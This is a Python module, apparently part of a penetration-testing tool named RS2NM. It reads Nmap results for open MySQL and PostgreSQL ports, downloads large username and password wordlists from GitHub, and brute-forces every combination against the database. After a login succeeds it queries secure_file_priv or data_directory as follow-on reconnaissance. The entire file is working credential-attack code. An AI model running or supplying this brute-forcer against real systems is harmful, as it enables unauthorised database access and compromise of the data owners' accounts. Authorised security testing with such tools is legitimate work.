import os
import re
import hashlib
import urllib.request
from getpass import getpass
import json

from core.handlers import fncEnsureInstalled
from core.utils    import fncPrintMessage

# URLs for brute-force wordlists and checksums
PW_URL       = "https://raw.githubusercontent.com/deannreid/rs2nm-files/refs/heads/main/BruteForce/passwords100k.pr0be"
PW_SUM_URL   = "https://raw.githubusercontent.com/deannreid/rs2nm-files/refs/heads/main/BruteForce/passwords100k.pr0be.checksum"
USER_URL     = "https://raw.githubusercontent.com/deannreid/rs2nm-files/refs/heads/main/BruteForce/usernames45k.pr0be"
USER_SUM_URL = "https://raw.githubusercontent.com/deannreid/rs2nm-files/refs/heads/main/BruteForce/usernames45k.pr0be.checksum"

# Map SQL ports
SQL_PORTS = {
    3306: "mysql",
    5432: "postgres"
}

def fncParseNmapFile(nmap_path_or_host):
    """
    Return {service: port} for open SQL ports.
    First tries to read a .nmap text file at nmap_path_or_host.
    If that doesn't exist, treats the argument as a host and loads
    ~/.rs2nm/temp/rs2nm_{host}.json for its "ports" list.
    """
    services = {}
    # 1) Try reading an Nmap .nmap text file
    if os.path.isfile(nmap_path_or_host):
        port_re = re.compile(r'^(\d+)/tcp\s+open')
        try:
            with open(nmap_path_or_host, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    m = port_re.match(line)
                    if m:
                        port = int(m.group(1))
                        if port in SQL_PORTS:
                            services[SQL_PORTS[port]] = port
            return services
        except Exception as e:
            fncPrintMessage(f"Error reading Nmap file: {e}", "warning")

    # 2) Fall back to JSON metadata in ~/.rs2nm/temp/rs2nm_{host}.json
    host = os.path.basename(nmap_path_or_host)
    meta = os.path.expanduser(f"~/.rs2nm/temp/rs2nm_{host}.json")
    if not os.path.isfile(meta):
        fncPrintMessage(f"Nmap file not found and no metadata JSON at {meta}", "error")
        return services

    try:
        with open(meta, 'r', encoding='utf-8') as jf:
            data = json.load(jf)
        ports_str = data.get("ports", "")
        for p in ports_str.split(","):
            p = p.strip()
            if not p:
                continue
            try:
                port = int(p)
                if port in SQL_PORTS:
                    services[SQL_PORTS[port]] = port
            except ValueError:
                continue
    except Exception as e:
        fncPrintMessage(f"Error reading JSON metadata: {e}", "error")

    return services

def fncComputeMD5(path):
    """Compute MD5 checksum of a file."""
    h = hashlib.md5()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            h.update(chunk)
    return h.hexdigest()

def fncDownloadIfNeeded(url, checksum_url, local_path):
    """
    Download the file if missing or if its MD5 does not match the remote checksum.
    """
    os.makedirs(os.path.dirname(local_path), exist_ok=True)
    need = True
    if os.path.isfile(local_path):
        try:
            local_sum  = fncComputeMD5(local_path)
            remote_sum = urllib.request.urlopen(checksum_url, timeout=10).read().decode().strip()
            if local_sum == remote_sum:
                fncPrintMessage(f"{os.path.basename(local_path)} exists and checksum matches", "info")
                need = False
        except Exception:
            need = True
    if need:
        fncPrintMessage(f"Downloading {os.path.basename(local_path)}…", "info")
        urllib.request.urlretrieve(url, local_path)
        fncPrintMessage(f"Saved → {local_path}", "success")

def fncTryLoginMySQL(host, port, user, password):
    """Attempt to login to MySQL."""
    try:
        import pymysql
    except ImportError:
        fncPrintMessage("pymysql not installed. Install with: pip install pymysql", "error")
        return None
    try:
        conn = pymysql.connect(host=host, port=port, user=user, password=password, connect_timeout=5)
        fncPrintMessage(f"MySQL login succeeded for '{user}'", "success")
        return conn
    except Exception as e:
        fncPrintMessage(f"MySQL login failed: {e}", "warning")
        return None

def fncTryLoginPostgres(host, port, user, password):
    """Attempt to login to PostgreSQL."""
    try:
        import psycopg2
    except ImportError:
        fncPrintMessage("psycopg2 not installed. Install with: pip install psycopg2", "error")
        return None
    try:
        conn = psycopg2.connect(host=host, port=port, user=user, password=password, connect_timeout=5)
        fncPrintMessage(f"PostgreSQL login succeeded for '{user}'", "success")
        return conn
    except Exception as e:
        fncPrintMessage(f"PostgreSQL login failed: {e}", "warning")
        return None

def fncPrivilegeInfoMySQL(conn):
    """Gather basic MySQL privilege info."""
    fncPrintMessage("Gathering MySQL privilege info…", "info")
    try:
        with conn.cursor() as cur:
            cur.execute("SHOW VARIABLES LIKE 'secure_file_priv';")
            priv = cur.fetchone()
            fncPrintMessage(f"secure_file_priv = {priv}", "info")
    except Exception as e:
        fncPrintMessage(f"MySQL privilege info error: {e}", "error")

def fncPrivilegeInfoPostgres(conn):
    """Gather basic PostgreSQL privilege info."""
    fncPrintMessage("Gathering PostgreSQL directory info…", "info")
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT current_setting('data_directory');")
            ddir = cur.fetchone()
            fncPrintMessage(f"data_directory = {ddir}", "info")
    except Exception as e:
        fncPrintMessage(f"Postgres privilege info error: {e}", "error")

def fncBruteForce(service, host, port, users, pwds):
    """
    Brute-force user/password combos.
    Returns (user, pwd, conn) on success, else (None, None, None).
    """
    fncPrintMessage(f"Brute-forcing {service} at {host}:{port}", "info")
    login_fn = fncTryLoginMySQL if service == "mysql" else fncTryLoginPostgres
    for u in users:
        for p in pwds:
            conn = login_fn(host, port, u.strip(), p.strip())
            if conn:
                return u.strip(), p.strip(), conn
    return None, None, None

def fncRunSQLEnum(nmap_file, host):
    """
    Entry point called by RS2NM.py. Parses Nmap output, then
    attempts login or brute-force against detected SQL services.
    """
    services = fncParseNmapFile(nmap_file)
    if not services:
        fncPrintMessage("No SQL services detected.", "warning")
        return

    fncPrintMessage(f"Detected SQL services: {services}", "info")

    # Directory for brute-force lists
    bf_dir = os.path.expanduser("~/.rs2nm/bin/sql")
    os.makedirs(bf_dir, exist_ok=True)
    pw_file   = os.path.join(bf_dir, "passwords100k.pr0be")
    user_file = os.path.join(bf_dir, "usernames45k.pr0be")

    for svc, port in services.items():
        conn = None
        if input(f"Have credentials for {svc}? (y/n): ").strip().lower() == 'y':
            user = input("Username: ").strip()
            pwd  = getpass("Password: ")
            conn = (fncTryLoginMySQL if svc=="mysql" else fncTryLoginPostgres)(host, port, user, pwd)
        else:
            if input("Brute-force superuser? (y/n): ").strip().lower() == 'y':
                fncDownloadIfNeeded(PW_URL,   PW_SUM_URL,   pw_file)
                fncDownloadIfNeeded(USER_URL, USER_SUM_URL, user_file)
                users = open(user_file, 'r', errors='ignore').read().splitlines()
                pwds  = open(pw_file,   'r', errors='ignore').read().splitlines()
                u, p, conn = fncBruteForce(svc, host, port, users, pwds)
                if conn:
                    fncPrintMessage(f"Brute-force succeeded: {u}/{p}", "success")

        if conn:
            fncPrintMessage(f"Connected as superuser to {svc}; gathering info…", "success")
            if svc == "mysql":
                fncPrivilegeInfoMySQL(conn)
            else:
                fncPrivilegeInfoPostgres(conn)
            conn.close()
        else:
            fncPrintMessage(f"No valid credentials for {svc}.", "warning")